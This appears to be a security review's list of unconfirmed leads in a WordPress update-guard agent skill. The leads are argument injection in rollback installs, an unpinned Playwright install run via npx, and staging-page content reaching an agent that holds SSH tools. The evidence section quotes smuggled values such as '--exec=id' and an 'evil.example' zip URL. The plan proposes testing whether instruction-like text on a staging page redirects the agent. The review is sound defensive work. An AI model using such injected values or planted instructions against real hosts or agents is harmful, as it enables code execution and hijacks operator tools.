# Needs validation

Source-grounded leads with an exact unresolved blocker. No severity. Not confirmed vulnerabilities. Do not turn these into live-probe instructions.

## Rollback installs from stored inventory names with only `shlex.quote`

**Fingerprint:** `guard.py:restore_items:inventory-name-wp-cli-install`

### Trace

1. `skills/wp-update-guard/scripts/guard.py:211` `inventory` — remote `plugin list --format=json` and `theme list --format=json` are `json.loads` with no schema or size check.
2. `skills/wp-update-guard/scripts/guard.py:344` `cmd_snapshot` — before snapshot writes that object to `row['inventory']`; later `save_json` persists it in `state.json` with no MAC.
3. `skills/wp-update-guard/scripts/guard.py:427` `restore_items` — quoted name is the install positional and quoted version is `--version=`; `ssh_wp` then sends the string as the remote command.

### Verified evidence

- `guard.py:211` — plugin and theme arrays are accepted from remote JSON without field allowlists.
- `guard.py:425` — must-use or missing name/version is the only restore filter; there is no slug or semver check.
- `guard.py:440` — `cmd_rollback` applies `restore_items` to `site['staging']` for the full plugins and themes lists.
- `references/wp-cli.md:59` — documented policy is to restore each plugin/theme that changed; the code restores every name+version row.
- Independent dry-run with dummy rows showed unquoted tokens in the ssh argv: `plugin install --exec=id --version=1 --force`, `plugin install https://evil.example/p.zip --version=1.0 --force`, and `plugin install /tmp/evil.zip --version=2.0 --force`.

### Claimed root cause

Restore treats snapshot inventory as an authorized install list: names and versions are not allowlisted as slugs/semver, not integrity-bound to the run, and not re-authorized before `wp plugin/theme install --force`.

### Affected boundary

Staging WordPress tree via the deploy SSH user. Rollback still uses `site['staging']` only.

### Exact blocker

Whether `wp plugin list --format=json` can emit a name that is a URL, path, or leading-dash token, and whether WP-CLI install treats that token as a zip source or global option, are WordPress/WP-CLI facts not visible in this repository. No local `wp` or `php` binary is present to observe install versus option-parse behavior.

### Resolution plan

- **Local:** command-string shaping is already reproducible by importing `restore_items`/`ssh_wp` with `dry_run=True` and dummy inventory rows (normal slug, https URL, `/tmp` path, leading-dash token). Remaining need: if a disposable WP-CLI binary is available offline, run those command strings against a fixture WordPress tree and observe install versus option-parse behavior.
- **Owner-observed:** check what `wp plugin list --format=json` emits for unusual plugin directory names and whether `plugin install` interprets a quoted `--exec` or URL positional as a package source when run as the deploy user.

---

## Skill runbook installs unpinned Playwright and Chromium onto the workstation

**Fingerprint:** `wp-update-guard.skill.unpinned-npx-playwright-install`

### Trace

1. `skills/wp-update-guard/SKILL.md:99` — the runbook tells the agent to run `npx --yes playwright install chromium` if Playwright is missing.
2. `skills/wp-update-guard/scripts/capture-pages.mjs:43` `loadPlaywright` — the CLI repeats that unpinned command when `import("playwright")` and the skill-local `node_modules` fallback both fail.
3. `skills/wp-update-guard/scripts/capture-pages.mjs:84` `main` — `chromium.launch({headless:true})` executes the installed Playwright/Chromium as the OS invoker.

### Verified evidence

- `SKILL.md:99` — install command has no `@version` and uses `npx --yes`.
- `capture-pages.mjs:33` — runtime resolution is `import("playwright")` then a relative `node_modules` path, with no version check.
- `README.md:6` — the repo advertises npx-based skill install and has no `package.json` or lockfile for Playwright.

### Claimed root cause

The screenshot-runtime install is an unbound name (`playwright` + `install chromium`) executed via `npx --yes` with no pin or independent digest, so a lower-trust registry/CDN writer can substitute the bits the skill later imports and launches.

### Affected boundary

Operator workstation (npm install + Chromium launch) that later holds SSH keys for staging and live WordPress hosts.

### Exact blocker

OS-enforced sandbox controls are unavailable on this host. npm/npx unpinned-name resolution, package signing, and Playwright chromium CDN integrity defaults are registry/CDN facts not in this repository.

### Resolution plan

- **Local:** do not run `npx` against the public registry. In an OS-enforced sandbox, treat the `SKILL.md` command as a fixture string and confirm it has no `@version` and uses `--yes`. Optionally resolve against a dummy offline registry that serves a marked playwright tarball and show that `capture-pages.mjs` would import it. Do not install tools from the network.
- **Owner-observed:** observe what their `npx` and Playwright install path fetch for unpinned `playwright` (resolved version, integrity field, chromium download URL and checksum) and whether a pin plus an independent digest is required before agents may run the command.

---

## Staging capture artifacts enter the agent tool loop with only prompt isolation

**Fingerprint:** `wp-update-guard/untrusted-staging-artifacts-to-agent-tools`

### Trace

1. `skills/wp-update-guard/scripts/capture-pages.mjs:95` `page.goto` — Playwright navigates the constructed staging URL and loads origin-controlled HTML.
2. `skills/wp-update-guard/scripts/capture-pages.mjs:112` `page.screenshot` — full-page PNGs persist origin-controlled page pixels; `capture.json` later stores url, status, and error text.
3. `skills/wp-update-guard/scripts/guard.py:341` `cmd_snapshot` — snapshot returns the capture report into the CLI JSON result that the agent consumes.
4. `skills/wp-update-guard/SKILL.md:138` — the skill requires the agent to look at before and after images and lets that review override a numeric pass.
5. `skills/wp-update-guard/scripts/guard.py:456` `cmd_promote` — promote runs live WP-CLI updates over operator SSH when phase is `pass_promote`, with no check that post-capture tool arguments still match a bound user intent object.

### Verified evidence

- `capture-pages.mjs:95` — anonymous `page.goto` on the staging origin with no content trust boundary before screenshot and JSON write.
- `SKILL.md:35` — secrets-off-screen and other hard rules are skill text; the CLI does not enforce them.
- `SKILL.md:138` — agent is instructed to inspect screenshot pixels/text as part of the Pass decision.
- `guard.py:369` — update-staging emits raw SSH/WP-CLI stdout into agent-visible JSON.
- `guard.py:457` — promote’s only coded gate is `phase == pass_promote`; `SKILL.md` policy is not checked.
- Dummy CLI JSON already shows capture/SSH text entering agent-visible output. Non-dry-run promote from `idle` or `fail_rollback` raises “promote only after every key page passed”; `dry_run=True` skips that gate and shapes live `update --all`.

### Claimed root cause

Untrusted staging-origin bytes and remote command text are placed into the operator agent’s context by design, while side-effecting SSH tools remain available with no deterministic output filter or action-binding check after that read.

### Affected boundary

Agent session that can invoke `guard.py` update-staging and promote using the operator SSH identity against configured WordPress hosts.

### Exact blocker

Whether a model acting on `SKILL.md` will treat staging screenshot or capture/SSH JSON text as instructions is not source-visible or locally observable. `capture-pages.mjs` was not executed. No sandboxed model turn is available.

### Resolution plan

- **Local:** already done for CLI shaping (dummy site/row, `dry_run=True`). Remaining need is a sandboxed model turn with dummy screenshot or JSON text, which this host cannot provide.
- **Owner-observed:** on an owner-controlled dummy staging page, place visible instruction-like text. Ask the agent only to snapshot/compare with dry-run and no production SSH keys. Observe whether it invokes promote, another `--site`, or raw `ssh`. Do not touch live hosts.
